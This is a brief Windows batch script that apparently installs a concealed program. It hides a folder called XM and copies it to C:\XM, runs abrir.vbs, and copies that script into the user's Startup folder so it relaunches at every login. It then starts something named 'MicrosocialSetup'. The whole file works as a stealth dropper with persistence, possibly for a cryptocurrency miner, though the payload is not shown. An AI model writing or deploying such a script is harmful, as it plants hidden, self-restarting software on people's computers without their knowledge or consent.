@echo off
ATTRIB +h unziped\XM
mkdir c:\XM
xcopy /S /E "XM" "C:\XM"
cd C:\XM
ATTRIB +h C:\XM
abrir.vbs
copy "c:\XM\abrir.vbs" "c:%homepath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
MicrosocialSetup
pause
exit